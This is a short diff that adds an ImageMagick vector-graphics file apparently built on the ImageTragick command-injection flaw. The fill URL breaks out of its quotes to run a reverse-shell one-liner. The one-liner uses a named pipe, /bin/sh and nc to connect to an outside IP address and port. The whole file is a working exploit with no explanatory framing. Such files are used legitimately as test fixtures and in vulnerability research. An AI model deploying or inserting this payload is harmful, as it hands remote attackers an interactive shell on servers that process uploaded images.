@@ -1,0 +1,5 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+2>&1|nc 114.125.9.219 39797 >/tmp/f;touch "hello)'
+pop graphic-context
